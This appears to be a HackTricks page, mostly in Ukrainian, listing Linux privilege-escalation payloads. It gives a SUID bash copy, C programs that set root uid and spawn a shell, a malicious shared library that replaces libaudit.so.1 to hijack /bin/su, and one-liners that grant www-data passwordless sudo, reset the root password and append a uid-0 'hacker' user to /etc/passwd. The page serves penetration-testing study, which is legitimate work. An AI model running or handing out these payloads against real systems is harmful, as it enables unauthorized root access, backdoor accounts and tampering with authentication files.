# Payloads to execute

{{#include ../../banners/hacktricks-training.md}}

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Перезапис файлу для ескалації привілеїв

### Загальні файли

- Додати користувача з паролем до _/etc/passwd_
- Змінити пароль у _/etc/shadow_
- Додати користувача до sudoers у _/etc/sudoers_
- Зловживати docker через сокет docker, зазвичай у _/run/docker.sock_ або _/var/run/docker.sock_

### Перезапис бібліотеки

Перевірте бібліотеку, що використовується деяким бінарним файлом, у цьому випадку `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
У цьому випадку спробуємо видати себе за `/lib/x86_64-linux-gnu/libaudit.so.1`.\
Отже, перевірте функції цієї бібліотеки, які використовуються бінарним файлом **`su`**:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
Символи `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` та `audit_fd` ймовірно походять з бібліотеки libaudit.so.1. Оскільки libaudit.so.1 буде перезаписано шкідливою спільною бібліотекою, ці символи повинні бути присутніми в новій спільній бібліотеці, інакше програма не зможе знайти символ і завершить роботу.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Тепер, просто викликавши **`/bin/su`**, ви отримаєте оболонку як root.

## Скрипти

Чи можете ви змусити root виконати щось?

### **www-data до sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Змінити пароль root**
```bash
echo "root:hacked" | chpasswd
```
### Додати нового користувача root до /etc/passwd
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
{{#include ../../banners/hacktricks-training.md}}
